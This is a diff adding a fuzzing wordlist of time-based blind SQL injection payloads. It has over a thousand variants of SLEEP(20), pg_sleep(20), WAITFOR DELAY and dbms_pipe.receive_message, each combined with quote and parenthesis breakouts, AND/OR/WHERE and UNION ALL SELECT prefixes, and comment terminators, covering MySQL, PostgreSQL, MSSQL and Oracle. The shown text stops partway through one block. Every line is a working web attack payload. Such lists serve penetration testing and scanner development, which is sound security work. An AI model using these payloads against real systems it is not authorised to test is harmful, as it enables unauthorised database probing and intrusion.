@@ -1,0 +1,1320 @@
+ AnD SELECT SLEEP(20)
+ AnD SELECT SLEEP(20) 
+ AnD SELECT SLEEP(20)"
+ AnD SELECT SLEEP(20)#
+ AnD SELECT SLEEP(20)'
+ AnD SELECT SLEEP(20))"
+ AnD SELECT SLEEP(20))'
+ AnD SELECT SLEEP(20)--
+ AnD SELECT SLEEP(20)-- -
+ AnD SELECT SLEEP(20)/*
+ AnD SELECT SLEEP(20);#
+ AnD SELECT SLEEP(20);%00
+ AnD SELECT SLEEP(20);--
+ AnD SELECT SLEEP(20);-- -
+ AnD SELECT SLEEP(20);/*
+ AnD SELECT pg_sleep(20)
+ AnD SELECT pg_sleep(20) 
+ AnD SELECT pg_sleep(20)"
+ AnD SELECT pg_sleep(20)#
+ AnD SELECT pg_sleep(20)'
+ AnD SELECT pg_sleep(20))"
+ AnD SELECT pg_sleep(20))'
+ AnD SELECT pg_sleep(20)--
+ AnD SELECT pg_sleep(20)-- -
+ AnD SELECT pg_sleep(20)/*
+ AnD SELECT pg_sleep(20);#
+ AnD SELECT pg_sleep(20);%00
+ AnD SELECT pg_sleep(20);--
+ AnD SELECT pg_sleep(20);-- -
+ AnD SELECT pg_sleep(20);/*
+ AnD WAITFOR DELAY '0:0:20'
+ AnD WAITFOR DELAY '0:0:20' 
+ AnD WAITFOR DELAY '0:0:20'"
+ AnD WAITFOR DELAY '0:0:20'#
+ AnD WAITFOR DELAY '0:0:20''
+ AnD WAITFOR DELAY '0:0:20')"
+ AnD WAITFOR DELAY '0:0:20')'
+ AnD WAITFOR DELAY '0:0:20'--
+ AnD WAITFOR DELAY '0:0:20'-- -
+ AnD WAITFOR DELAY '0:0:20'/*
+ AnD WAITFOR DELAY '0:0:20';#
+ AnD WAITFOR DELAY '0:0:20';%00
+ AnD WAITFOR DELAY '0:0:20';--
+ AnD WAITFOR DELAY '0:0:20';-- -
+ AnD WAITFOR DELAY '0:0:20';/*
+ AnD dbms_pipe.receive_message(('a'),20)
+ AnD dbms_pipe.receive_message(('a'),20) 
+ AnD dbms_pipe.receive_message(('a'),20)"
+ AnD dbms_pipe.receive_message(('a'),20)#
+ AnD dbms_pipe.receive_message(('a'),20)'
+ AnD dbms_pipe.receive_message(('a'),20))"
+ AnD dbms_pipe.receive_message(('a'),20))'
+ AnD dbms_pipe.receive_message(('a'),20)--
+ AnD dbms_pipe.receive_message(('a'),20)-- -
+ AnD dbms_pipe.receive_message(('a'),20)/*
+ AnD dbms_pipe.receive_message(('a'),20);#
+ AnD dbms_pipe.receive_message(('a'),20);%00
+ AnD dbms_pipe.receive_message(('a'),20);--
+ AnD dbms_pipe.receive_message(('a'),20);-- -
+ AnD dbms_pipe.receive_message(('a'),20);/*
+ SELECT SLEEP(20)
+ SELECT SLEEP(20) 
+ SELECT SLEEP(20)"
+ SELECT SLEEP(20)#
+ SELECT SLEEP(20)'
+ SELECT SLEEP(20))"
+ SELECT SLEEP(20))'
+ SELECT SLEEP(20)--
+ SELECT SLEEP(20)-- -
+ SELECT SLEEP(20)/*
+ SELECT SLEEP(20);#
+ SELECT SLEEP(20);%00
+ SELECT SLEEP(20);--
+ SELECT SLEEP(20);-- -
+ SELECT SLEEP(20);/*
+ SELECT pg_sleep(20)
+ SELECT pg_sleep(20) 
+ SELECT pg_sleep(20)"
+ SELECT pg_sleep(20)#
+ SELECT pg_sleep(20)'
+ SELECT pg_sleep(20))"
+ SELECT pg_sleep(20))'
+ SELECT pg_sleep(20)--
+ SELECT pg_sleep(20)-- -
+ SELECT pg_sleep(20)/*
+ SELECT pg_sleep(20);#
+ SELECT pg_sleep(20);%00
+ SELECT pg_sleep(20);--
+ SELECT pg_sleep(20);-- -
+ SELECT pg_sleep(20);/*
+ WAITFOR DELAY '0:0:20'
+ WAITFOR DELAY '0:0:20' 
+ WAITFOR DELAY '0:0:20'"
+ WAITFOR DELAY '0:0:20'#
+ WAITFOR DELAY '0:0:20''
+ WAITFOR DELAY '0:0:20')"
+ WAITFOR DELAY '0:0:20')'
+ WAITFOR DELAY '0:0:20'--
+ WAITFOR DELAY '0:0:20'-- -
+ WAITFOR DELAY '0:0:20'/*
+ WAITFOR DELAY '0:0:20';#
+ WAITFOR DELAY '0:0:20';%00
+ WAITFOR DELAY '0:0:20';--
+ WAITFOR DELAY '0:0:20';-- -
+ WAITFOR DELAY '0:0:20';/*
+ WhErE SELECT SLEEP(20)
+ WhErE SELECT SLEEP(20) 
+ WhErE SELECT SLEEP(20)"
+ WhErE SELECT SLEEP(20)#
+ WhErE SELECT SLEEP(20)'
+ WhErE SELECT SLEEP(20))"
+ WhErE SELECT SLEEP(20))'
+ WhErE SELECT SLEEP(20)--
+ WhErE SELECT SLEEP(20)-- -
+ WhErE SELECT SLEEP(20)/*
+ WhErE SELECT SLEEP(20);#
+ WhErE SELECT SLEEP(20);%00
+ WhErE SELECT SLEEP(20);--
+ WhErE SELECT SLEEP(20);-- -
+ WhErE SELECT SLEEP(20);/*
+ WhErE SELECT pg_sleep(20)
+ WhErE SELECT pg_sleep(20) 
+ WhErE SELECT pg_sleep(20)"
+ WhErE SELECT pg_sleep(20)#
+ WhErE SELECT pg_sleep(20)'
+ WhErE SELECT pg_sleep(20))"
+ WhErE SELECT pg_sleep(20))'
+ WhErE SELECT pg_sleep(20)--
+ WhErE SELECT pg_sleep(20)-- -
+ WhErE SELECT pg_sleep(20)/*
+ WhErE SELECT pg_sleep(20);#
+ WhErE SELECT pg_sleep(20);%00
+ WhErE SELECT pg_sleep(20);--
+ WhErE SELECT pg_sleep(20);-- -
+ WhErE SELECT pg_sleep(20);/*
+ WhErE WAITFOR DELAY '0:0:20'
+ WhErE WAITFOR DELAY '0:0:20' 
+ WhErE WAITFOR DELAY '0:0:20'"
+ WhErE WAITFOR DELAY '0:0:20'#
+ WhErE WAITFOR DELAY '0:0:20''
+ WhErE WAITFOR DELAY '0:0:20')"
+ WhErE WAITFOR DELAY '0:0:20')'
+ WhErE WAITFOR DELAY '0:0:20'--
+ WhErE WAITFOR DELAY '0:0:20'-- -
+ WhErE WAITFOR DELAY '0:0:20'/*
+ WhErE WAITFOR DELAY '0:0:20';#
+ WhErE WAITFOR DELAY '0:0:20';%00
+ WhErE WAITFOR DELAY '0:0:20';--
+ WhErE WAITFOR DELAY '0:0:20';-- -
+ WhErE WAITFOR DELAY '0:0:20';/*
+ WhErE dbms_pipe.receive_message(('a'),20)
+ WhErE dbms_pipe.receive_message(('a'),20) 
+ WhErE dbms_pipe.receive_message(('a'),20)"
+ WhErE dbms_pipe.receive_message(('a'),20)#
+ WhErE dbms_pipe.receive_message(('a'),20)'
+ WhErE dbms_pipe.receive_message(('a'),20))"
+ WhErE dbms_pipe.receive_message(('a'),20))'
+ WhErE dbms_pipe.receive_message(('a'),20)--
+ WhErE dbms_pipe.receive_message(('a'),20)-- -
+ WhErE dbms_pipe.receive_message(('a'),20)/*
+ WhErE dbms_pipe.receive_message(('a'),20);#
+ WhErE dbms_pipe.receive_message(('a'),20);%00
+ WhErE dbms_pipe.receive_message(('a'),20);--
+ WhErE dbms_pipe.receive_message(('a'),20);-- -
+ WhErE dbms_pipe.receive_message(('a'),20);/*
+ dbms_pipe.receive_message(('a'),20)
+ dbms_pipe.receive_message(('a'),20) 
+ dbms_pipe.receive_message(('a'),20)"
+ dbms_pipe.receive_message(('a'),20)#
+ dbms_pipe.receive_message(('a'),20)'
+ dbms_pipe.receive_message(('a'),20))"
+ dbms_pipe.receive_message(('a'),20))'
+ dbms_pipe.receive_message(('a'),20)--
+ dbms_pipe.receive_message(('a'),20)-- -
+ dbms_pipe.receive_message(('a'),20)/*
+ dbms_pipe.receive_message(('a'),20);#
+ dbms_pipe.receive_message(('a'),20);%00
+ dbms_pipe.receive_message(('a'),20);--
+ dbms_pipe.receive_message(('a'),20);-- -
+ dbms_pipe.receive_message(('a'),20);/*
+ oR SELECT SLEEP(20)
+ oR SELECT SLEEP(20) 
+ oR SELECT SLEEP(20)"
+ oR SELECT SLEEP(20)#
+ oR SELECT SLEEP(20)'
+ oR SELECT SLEEP(20))"
+ oR SELECT SLEEP(20))'
+ oR SELECT SLEEP(20)--
+ oR SELECT SLEEP(20)-- -
+ oR SELECT SLEEP(20)/*
+ oR SELECT SLEEP(20);#
+ oR SELECT SLEEP(20);%00
+ oR SELECT SLEEP(20);--
+ oR SELECT SLEEP(20);-- -
+ oR SELECT SLEEP(20);/*
+ oR SELECT pg_sleep(20)
+ oR SELECT pg_sleep(20) 
+ oR SELECT pg_sleep(20)"
+ oR SELECT pg_sleep(20)#
+ oR SELECT pg_sleep(20)'
+ oR SELECT pg_sleep(20))"
+ oR SELECT pg_sleep(20))'
+ oR SELECT pg_sleep(20)--
+ oR SELECT pg_sleep(20)-- -
+ oR SELECT pg_sleep(20)/*
+ oR SELECT pg_sleep(20);#
+ oR SELECT pg_sleep(20);%00
+ oR SELECT pg_sleep(20);--
+ oR SELECT pg_sleep(20);-- -
+ oR SELECT pg_sleep(20);/*
+ oR WAITFOR DELAY '0:0:20'
+ oR WAITFOR DELAY '0:0:20' 
+ oR WAITFOR DELAY '0:0:20'"
+ oR WAITFOR DELAY '0:0:20'#
+ oR WAITFOR DELAY '0:0:20''
+ oR WAITFOR DELAY '0:0:20')"
+ oR WAITFOR DELAY '0:0:20')'
+ oR WAITFOR DELAY '0:0:20'--
+ oR WAITFOR DELAY '0:0:20'-- -
+ oR WAITFOR DELAY '0:0:20'/*
+ oR WAITFOR DELAY '0:0:20';#
+ oR WAITFOR DELAY '0:0:20';%00
+ oR WAITFOR DELAY '0:0:20';--
+ oR WAITFOR DELAY '0:0:20';-- -
+ oR WAITFOR DELAY '0:0:20';/*
+ oR dbms_pipe.receive_message(('a'),20)
+ oR dbms_pipe.receive_message(('a'),20) 
+ oR dbms_pipe.receive_message(('a'),20)"
+ oR dbms_pipe.receive_message(('a'),20)#
+ oR dbms_pipe.receive_message(('a'),20)'
+ oR dbms_pipe.receive_message(('a'),20))"
+ oR dbms_pipe.receive_message(('a'),20))'
+ oR dbms_pipe.receive_message(('a'),20)--
+ oR dbms_pipe.receive_message(('a'),20)-- -
+ oR dbms_pipe.receive_message(('a'),20)/*
+ oR dbms_pipe.receive_message(('a'),20);#
+ oR dbms_pipe.receive_message(('a'),20);%00
+ oR dbms_pipe.receive_message(('a'),20);--
+ oR dbms_pipe.receive_message(('a'),20);-- -
+ oR dbms_pipe.receive_message(('a'),20);/*
+"(SELECT SLEEP(20)
+"(SELECT SLEEP(20) 
+"(SELECT SLEEP(20)"
+"(SELECT SLEEP(20)#
+"(SELECT SLEEP(20)'
+"(SELECT SLEEP(20))"
+"(SELECT SLEEP(20))'
+"(SELECT SLEEP(20)--
+"(SELECT SLEEP(20)-- -
+"(SELECT SLEEP(20)/*
+"(SELECT SLEEP(20);#
+"(SELECT SLEEP(20);%00
+"(SELECT SLEEP(20);--
+"(SELECT SLEEP(20);-- -
+"(SELECT SLEEP(20);/*
+"(SELECT pg_sleep(20)
+"(SELECT pg_sleep(20) 
+"(SELECT pg_sleep(20)"
+"(SELECT pg_sleep(20)#
+"(SELECT pg_sleep(20)'
+"(SELECT pg_sleep(20))"
+"(SELECT pg_sleep(20))'
+"(SELECT pg_sleep(20)--
+"(SELECT pg_sleep(20)-- -
+"(SELECT pg_sleep(20)/*
+"(SELECT pg_sleep(20);#
+"(SELECT pg_sleep(20);%00
+"(SELECT pg_sleep(20);--
+"(SELECT pg_sleep(20);-- -
+"(SELECT pg_sleep(20);/*
+"(WAITFOR DELAY '0:0:20'
+"(WAITFOR DELAY '0:0:20' 
+"(WAITFOR DELAY '0:0:20'"
+"(WAITFOR DELAY '0:0:20'#
+"(WAITFOR DELAY '0:0:20''
+"(WAITFOR DELAY '0:0:20')"
+"(WAITFOR DELAY '0:0:20')'
+"(WAITFOR DELAY '0:0:20'--
+"(WAITFOR DELAY '0:0:20'-- -
+"(WAITFOR DELAY '0:0:20'/*
+"(WAITFOR DELAY '0:0:20';#
+"(WAITFOR DELAY '0:0:20';%00
+"(WAITFOR DELAY '0:0:20';--
+"(WAITFOR DELAY '0:0:20';-- -
+"(WAITFOR DELAY '0:0:20';/*
+"(dbms_pipe.receive_message(('a'),20)
+"(dbms_pipe.receive_message(('a'),20) 
+"(dbms_pipe.receive_message(('a'),20)"
+"(dbms_pipe.receive_message(('a'),20)#
+"(dbms_pipe.receive_message(('a'),20)'
+"(dbms_pipe.receive_message(('a'),20))"
+"(dbms_pipe.receive_message(('a'),20))'
+"(dbms_pipe.receive_message(('a'),20)--
+"(dbms_pipe.receive_message(('a'),20)-- -
+"(dbms_pipe.receive_message(('a'),20)/*
+"(dbms_pipe.receive_message(('a'),20);#
+"(dbms_pipe.receive_message(('a'),20);%00
+"(dbms_pipe.receive_message(('a'),20);--
+"(dbms_pipe.receive_message(('a'),20);-- -
+"(dbms_pipe.receive_message(('a'),20);/*
+");SELECT SLEEP(20)
+");SELECT SLEEP(20) 
+");SELECT SLEEP(20)"
+");SELECT SLEEP(20)#
+");SELECT SLEEP(20)'
+");SELECT SLEEP(20))"
+");SELECT SLEEP(20))'
+");SELECT SLEEP(20)--
+");SELECT SLEEP(20)-- -
+");SELECT SLEEP(20)/*
+");SELECT SLEEP(20);#
+");SELECT SLEEP(20);%00
+");SELECT SLEEP(20);--
+");SELECT SLEEP(20);-- -
+");SELECT SLEEP(20);/*
+");SELECT pg_sleep(20)
+");SELECT pg_sleep(20) 
+");SELECT pg_sleep(20)"
+");SELECT pg_sleep(20)#
+");SELECT pg_sleep(20)'
+");SELECT pg_sleep(20))"
+");SELECT pg_sleep(20))'
+");SELECT pg_sleep(20)--
+");SELECT pg_sleep(20)-- -
+");SELECT pg_sleep(20)/*
+");SELECT pg_sleep(20);#
+");SELECT pg_sleep(20);%00
+");SELECT pg_sleep(20);--
+");SELECT pg_sleep(20);-- -
+");SELECT pg_sleep(20);/*
+");WAITFOR DELAY '0:0:20'
+");WAITFOR DELAY '0:0:20' 
+");WAITFOR DELAY '0:0:20'"
+");WAITFOR DELAY '0:0:20'#
+");WAITFOR DELAY '0:0:20''
+");WAITFOR DELAY '0:0:20')"
+");WAITFOR DELAY '0:0:20')'
+");WAITFOR DELAY '0:0:20'--
+");WAITFOR DELAY '0:0:20'-- -
+");WAITFOR DELAY '0:0:20'/*
+");WAITFOR DELAY '0:0:20';#
+");WAITFOR DELAY '0:0:20';%00
+");WAITFOR DELAY '0:0:20';--
+");WAITFOR DELAY '0:0:20';-- -
+");WAITFOR DELAY '0:0:20';/*
+");dbms_pipe.receive_message(('a'),20)
+");dbms_pipe.receive_message(('a'),20) 
+");dbms_pipe.receive_message(('a'),20)"
+");dbms_pipe.receive_message(('a'),20)#
+");dbms_pipe.receive_message(('a'),20)'
+");dbms_pipe.receive_message(('a'),20))"
+");dbms_pipe.receive_message(('a'),20))'
+");dbms_pipe.receive_message(('a'),20)--
+");dbms_pipe.receive_message(('a'),20)-- -
+");dbms_pipe.receive_message(('a'),20)/*
+");dbms_pipe.receive_message(('a'),20);#
+");dbms_pipe.receive_message(('a'),20);%00
+");dbms_pipe.receive_message(('a'),20);--
+");dbms_pipe.receive_message(('a'),20);-- -
+");dbms_pipe.receive_message(('a'),20);/*
+")SELECT SLEEP(20)
+")SELECT SLEEP(20) 
+")SELECT SLEEP(20)"
+")SELECT SLEEP(20)#
+")SELECT SLEEP(20)'
+")SELECT SLEEP(20))"
+")SELECT SLEEP(20))'
+")SELECT SLEEP(20)--
+")SELECT SLEEP(20)-- -
+")SELECT SLEEP(20)/*
+")SELECT SLEEP(20);#
+")SELECT SLEEP(20);%00
+")SELECT SLEEP(20);--
+")SELECT SLEEP(20);-- -
+")SELECT SLEEP(20);/*
+")SELECT pg_sleep(20)
+")SELECT pg_sleep(20) 
+")SELECT pg_sleep(20)"
+")SELECT pg_sleep(20)#
+")SELECT pg_sleep(20)'
+")SELECT pg_sleep(20))"
+")SELECT pg_sleep(20))'
+")SELECT pg_sleep(20)--
+")SELECT pg_sleep(20)-- -
+")SELECT pg_sleep(20)/*
+")SELECT pg_sleep(20);#
+")SELECT pg_sleep(20);%00
+")SELECT pg_sleep(20);--
+")SELECT pg_sleep(20);-- -
+")SELECT pg_sleep(20);/*
+")WAITFOR DELAY '0:0:20'
+")WAITFOR DELAY '0:0:20' 
+")WAITFOR DELAY '0:0:20'"
+")WAITFOR DELAY '0:0:20'#
+")WAITFOR DELAY '0:0:20''
+")WAITFOR DELAY '0:0:20')"
+")WAITFOR DELAY '0:0:20')'
+")WAITFOR DELAY '0:0:20'--
+")WAITFOR DELAY '0:0:20'-- -
+")WAITFOR DELAY '0:0:20'/*
+")WAITFOR DELAY '0:0:20';#
+")WAITFOR DELAY '0:0:20';%00
+")WAITFOR DELAY '0:0:20';--
+")WAITFOR DELAY '0:0:20';-- -
+")WAITFOR DELAY '0:0:20';/*
+")dbms_pipe.receive_message(('a'),20)
+")dbms_pipe.receive_message(('a'),20) 
+")dbms_pipe.receive_message(('a'),20)"
+")dbms_pipe.receive_message(('a'),20)#
+")dbms_pipe.receive_message(('a'),20)'
+")dbms_pipe.receive_message(('a'),20))"
+")dbms_pipe.receive_message(('a'),20))'
+")dbms_pipe.receive_message(('a'),20)--
+")dbms_pipe.receive_message(('a'),20)-- -
+")dbms_pipe.receive_message(('a'),20)/*
+")dbms_pipe.receive_message(('a'),20);#
+")dbms_pipe.receive_message(('a'),20);%00
+")dbms_pipe.receive_message(('a'),20);--
+")dbms_pipe.receive_message(('a'),20);-- -
+")dbms_pipe.receive_message(('a'),20);/*
+";)SELECT SLEEP(20)
+";)SELECT SLEEP(20) 
+";)SELECT SLEEP(20)"
+";)SELECT SLEEP(20)#
+";)SELECT SLEEP(20)'
+";)SELECT SLEEP(20))"
+";)SELECT SLEEP(20))'
+";)SELECT SLEEP(20)--
+";)SELECT SLEEP(20)-- -
+";)SELECT SLEEP(20)/*
+";)SELECT SLEEP(20);#
+";)SELECT SLEEP(20);%00
+";)SELECT SLEEP(20);--
+";)SELECT SLEEP(20);-- -
+";)SELECT SLEEP(20);/*
+";)SELECT pg_sleep(20)
+";)SELECT pg_sleep(20) 
+";)SELECT pg_sleep(20)"
+";)SELECT pg_sleep(20)#
+";)SELECT pg_sleep(20)'
+";)SELECT pg_sleep(20))"
+";)SELECT pg_sleep(20))'
+";)SELECT pg_sleep(20)--
+";)SELECT pg_sleep(20)-- -
+";)SELECT pg_sleep(20)/*
+";)SELECT pg_sleep(20);#
+";)SELECT pg_sleep(20);%00
+";)SELECT pg_sleep(20);--
+";)SELECT pg_sleep(20);-- -
+";)SELECT pg_sleep(20);/*
+";)WAITFOR DELAY '0:0:20'
+";)WAITFOR DELAY '0:0:20' 
+";)WAITFOR DELAY '0:0:20'"
+";)WAITFOR DELAY '0:0:20'#
+";)WAITFOR DELAY '0:0:20''
+";)WAITFOR DELAY '0:0:20')"
+";)WAITFOR DELAY '0:0:20')'
+";)WAITFOR DELAY '0:0:20'--
+";)WAITFOR DELAY '0:0:20'-- -
+";)WAITFOR DELAY '0:0:20'/*
+";)WAITFOR DELAY '0:0:20';#
+";)WAITFOR DELAY '0:0:20';%00
+";)WAITFOR DELAY '0:0:20';--
+";)WAITFOR DELAY '0:0:20';-- -
+";)WAITFOR DELAY '0:0:20';/*
+";)dbms_pipe.receive_message(('a'),20)
+";)dbms_pipe.receive_message(('a'),20) 
+";)dbms_pipe.receive_message(('a'),20)"
+";)dbms_pipe.receive_message(('a'),20)#
+";)dbms_pipe.receive_message(('a'),20)'
+";)dbms_pipe.receive_message(('a'),20))"
+";)dbms_pipe.receive_message(('a'),20))'
+";)dbms_pipe.receive_message(('a'),20)--
+";)dbms_pipe.receive_message(('a'),20)-- -
+";)dbms_pipe.receive_message(('a'),20)/*
+";)dbms_pipe.receive_message(('a'),20);#
+";)dbms_pipe.receive_message(('a'),20);%00
+";)dbms_pipe.receive_message(('a'),20);--
+";)dbms_pipe.receive_message(('a'),20);-- -
+";)dbms_pipe.receive_message(('a'),20);/*
+"SELECT SLEEP(20)
+"SELECT SLEEP(20) 
+"SELECT SLEEP(20)"
+"SELECT SLEEP(20)#
+"SELECT SLEEP(20)'
+"SELECT SLEEP(20))"
+"SELECT SLEEP(20))'
+"SELECT SLEEP(20)--
+"SELECT SLEEP(20)-- -
+"SELECT SLEEP(20)/*
+"SELECT SLEEP(20);#
+"SELECT SLEEP(20);%00
+"SELECT SLEEP(20);--
+"SELECT SLEEP(20);-- -
+"SELECT SLEEP(20);/*
+"SELECT pg_sleep(20)
+"SELECT pg_sleep(20) 
+"SELECT pg_sleep(20)"
+"SELECT pg_sleep(20)#
+"SELECT pg_sleep(20)'
+"SELECT pg_sleep(20))"
+"SELECT pg_sleep(20))'
+"SELECT pg_sleep(20)--
+"SELECT pg_sleep(20)-- -
+"SELECT pg_sleep(20)/*
+"SELECT pg_sleep(20);#
+"SELECT pg_sleep(20);%00
+"SELECT pg_sleep(20);--
+"SELECT pg_sleep(20);-- -
+"SELECT pg_sleep(20);/*
+"WAITFOR DELAY '0:0:20'
+"WAITFOR DELAY '0:0:20' 
+"WAITFOR DELAY '0:0:20'"
+"WAITFOR DELAY '0:0:20'#
+"WAITFOR DELAY '0:0:20''
+"WAITFOR DELAY '0:0:20')"
+"WAITFOR DELAY '0:0:20')'
+"WAITFOR DELAY '0:0:20'--
+"WAITFOR DELAY '0:0:20'-- -
+"WAITFOR DELAY '0:0:20'/*
+"WAITFOR DELAY '0:0:20';#
+"WAITFOR DELAY '0:0:20';%00
+"WAITFOR DELAY '0:0:20';--
+"WAITFOR DELAY '0:0:20';-- -
+"WAITFOR DELAY '0:0:20';/*
+"dbms_pipe.receive_message(('a'),20)
+"dbms_pipe.receive_message(('a'),20) 
+"dbms_pipe.receive_message(('a'),20)"
+"dbms_pipe.receive_message(('a'),20)#
+"dbms_pipe.receive_message(('a'),20)'
+"dbms_pipe.receive_message(('a'),20))"
+"dbms_pipe.receive_message(('a'),20))'
+"dbms_pipe.receive_message(('a'),20)--
+"dbms_pipe.receive_message(('a'),20)-- -
+"dbms_pipe.receive_message(('a'),20)/*
+"dbms_pipe.receive_message(('a'),20);#
+"dbms_pipe.receive_message(('a'),20);%00
+"dbms_pipe.receive_message(('a'),20);--
+"dbms_pipe.receive_message(('a'),20);-- -
+"dbms_pipe.receive_message(('a'),20);/*
+&&SELECT SLEEP(20)
+&&SELECT SLEEP(20) 
+&&SELECT SLEEP(20)"
+&&SELECT SLEEP(20)#
+&&SELECT SLEEP(20)'
+&&SELECT SLEEP(20))"
+&&SELECT SLEEP(20))'
+&&SELECT SLEEP(20)--
+&&SELECT SLEEP(20)-- -
+&&SELECT SLEEP(20)/*
+&&SELECT SLEEP(20);#
+&&SELECT SLEEP(20);%00
+&&SELECT SLEEP(20);--
+&&SELECT SLEEP(20);-- -
+&&SELECT SLEEP(20);/*
+&&SELECT pg_sleep(20)
+&&SELECT pg_sleep(20) 
+&&SELECT pg_sleep(20)"
+&&SELECT pg_sleep(20)#
+&&SELECT pg_sleep(20)'
+&&SELECT pg_sleep(20))"
+&&SELECT pg_sleep(20))'
+&&SELECT pg_sleep(20)--
+&&SELECT pg_sleep(20)-- -
+&&SELECT pg_sleep(20)/*
+&&SELECT pg_sleep(20);#
+&&SELECT pg_sleep(20);%00
+&&SELECT pg_sleep(20);--
+&&SELECT pg_sleep(20);-- -
+&&SELECT pg_sleep(20);/*
+&&WAITFOR DELAY '0:0:20'
+&&WAITFOR DELAY '0:0:20' 
+&&WAITFOR DELAY '0:0:20'"
+&&WAITFOR DELAY '0:0:20'#
+&&WAITFOR DELAY '0:0:20''
+&&WAITFOR DELAY '0:0:20')"
+&&WAITFOR DELAY '0:0:20')'
+&&WAITFOR DELAY '0:0:20'--
+&&WAITFOR DELAY '0:0:20'-- -
+&&WAITFOR DELAY '0:0:20'/*
+&&WAITFOR DELAY '0:0:20';#
+&&WAITFOR DELAY '0:0:20';%00
+&&WAITFOR DELAY '0:0:20';--
+&&WAITFOR DELAY '0:0:20';-- -
+&&WAITFOR DELAY '0:0:20';/*
+&&dbms_pipe.receive_message(('a'),20)
+&&dbms_pipe.receive_message(('a'),20) 
+&&dbms_pipe.receive_message(('a'),20)"
+&&dbms_pipe.receive_message(('a'),20)#
+&&dbms_pipe.receive_message(('a'),20)'
+&&dbms_pipe.receive_message(('a'),20))"
+&&dbms_pipe.receive_message(('a'),20))'
+&&dbms_pipe.receive_message(('a'),20)--
+&&dbms_pipe.receive_message(('a'),20)-- -
+&&dbms_pipe.receive_message(('a'),20)/*
+&&dbms_pipe.receive_message(('a'),20);#
+&&dbms_pipe.receive_message(('a'),20);%00
+&&dbms_pipe.receive_message(('a'),20);--
+&&dbms_pipe.receive_message(('a'),20);-- -
+&&dbms_pipe.receive_message(('a'),20);/*
+' UnIoN AlL SeLeCtSELECT SLEEP(20)
+' UnIoN AlL SeLeCtSELECT SLEEP(20) 
+' UnIoN AlL SeLeCtSELECT SLEEP(20)"
+' UnIoN AlL SeLeCtSELECT SLEEP(20)#
+' UnIoN AlL SeLeCtSELECT SLEEP(20)'
+' UnIoN AlL SeLeCtSELECT SLEEP(20))"
+' UnIoN AlL SeLeCtSELECT SLEEP(20))'
+' UnIoN AlL SeLeCtSELECT SLEEP(20)--
+' UnIoN AlL SeLeCtSELECT SLEEP(20)-- -
+' UnIoN AlL SeLeCtSELECT SLEEP(20)/*
+' UnIoN AlL SeLeCtSELECT SLEEP(20);#
+' UnIoN AlL SeLeCtSELECT SLEEP(20);%00
+' UnIoN AlL SeLeCtSELECT SLEEP(20);--
+' UnIoN AlL SeLeCtSELECT SLEEP(20);-- -
+' UnIoN AlL SeLeCtSELECT SLEEP(20);/*
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)
+' UnIoN AlL SeLeCtSELECT pg_sleep(20) 
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)"
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)#
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)'
+' UnIoN AlL SeLeCtSELECT pg_sleep(20))"
+' UnIoN AlL SeLeCtSELECT pg_sleep(20))'
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)--
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)-- -
+' UnIoN AlL SeLeCtSELECT pg_sleep(20)/*
+' UnIoN AlL SeLeCtSELECT pg_sleep(20);#
+' UnIoN AlL SeLeCtSELECT pg_sleep(20);%00
+' UnIoN AlL SeLeCtSELECT pg_sleep(20);--
+' UnIoN AlL SeLeCtSELECT pg_sleep(20);-- -
+' UnIoN AlL SeLeCtSELECT pg_sleep(20);/*
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20' 
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'"
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'#
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20''
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20')"
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20')'
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'--
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'-- -
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20'/*
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20';#
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20';%00
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20';--
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20';-- -
+' UnIoN AlL SeLeCtWAITFOR DELAY '0:0:20';/*
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20) 
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)"
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)#
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)'
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20))"
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20))'
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)--
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)-- -
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20)/*
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20);#
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20);%00
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20);--
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20);-- -
+' UnIoN AlL SeLeCtdbms_pipe.receive_message(('a'),20);/*
+'(SELECT SLEEP(20)
+'(SELECT SLEEP(20) 
+'(SELECT SLEEP(20)"
+'(SELECT SLEEP(20)#
+'(SELECT SLEEP(20)'
+'(SELECT SLEEP(20))"
+'(SELECT SLEEP(20))'
+'(SELECT SLEEP(20)--
+'(SELECT SLEEP(20)-- -
+'(SELECT SLEEP(20)/*
+'(SELECT SLEEP(20);#
+'(SELECT SLEEP(20);%00
+'(SELECT SLEEP(20);--
+'(SELECT SLEEP(20);-- -
+'(SELECT SLEEP(20);/*
+'(SELECT pg_sleep(20)
+'(SELECT pg_sleep(20) 
+'(SELECT pg_sleep(20)"
+'(SELECT pg_sleep(20)#
+'(SELECT pg_sleep(20)'
+'(SELECT pg_sleep(20))"
+'(SELECT pg_sleep(20))'
+'(SELECT pg_sleep(20)--
+'(SELECT pg_sleep(20)-- -
+'(SELECT pg_sleep(20)/*
+'(SELECT pg_sleep(20);#
